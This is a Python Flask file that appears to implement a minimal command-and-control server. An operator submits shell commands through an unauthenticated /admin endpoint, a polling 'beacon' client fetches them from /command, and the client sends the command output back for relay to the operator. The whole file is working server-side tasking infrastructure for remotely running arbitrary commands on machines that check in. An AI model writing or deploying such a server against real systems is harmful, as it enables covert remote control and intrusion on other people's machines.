from flask import Flask, request, jsonify
from uuid import uuid4
import time

app = Flask(__name__)

new_jobs = dict()
finished_jobs = dict()

TIMEOUT = 10



@app.route('/admin', methods=['POST'])
# new command
def post_admin():
    data = request.get_json()
    if not data:
        return jsonify({"error": "No data provided"}), 400

    job_id = str(uuid4())
    job = {"id": job_id, "command": data.get("command", "")}

    # add job to pending jobs dict
    new_jobs[job_id] = job

    # initialize finished_jobs entry
    finished_jobs[job_id] = None

    start = time.time()
    while time.time() - start < TIMEOUT:
        result = finished_jobs.get(job_id)
        if result is not None:
            finished_jobs.pop(job_id)
            return jsonify({"message": "Output captured", "data": result}), 200
        # sleep briefly to avoid busy-waiting
        time.sleep(0.1)

    return jsonify({"error": "Timeout waiting for output"}), 504








@app.route('/command', methods=['GET'])
# beacon
def get_command():
    if not new_jobs:  # dict is empty
        return jsonify({}), 200

    # get the first job (dicts preserve insertion order in Python 3.7+)
    job_id, job = next(iter(new_jobs.items()))

    # remove it from the dict so it's not given again
    new_jobs.pop(job_id)

    return jsonify({
        "message": "Command attached",
        "command": job["command"],
        "id": job_id
    }), 200



@app.route('/command', methods=['POST'])
# served command
def post_command():
    data = request.get_json()
    if not data:
        return jsonify({"error": "No data provided"}), 400
    
    job_id = data.get("id")
    output = data.get("output", "")
    
    # store result in dict keyed by job_id
    finished_jobs[job_id] = output

    # For debugging, you might want to log the received data
    # print(f"Received output for job {job_id}: {output}")
    
    return jsonify({"message": "Output captured"}), 200



if __name__ == '__main__':
    app.run(debug=True, port=5000)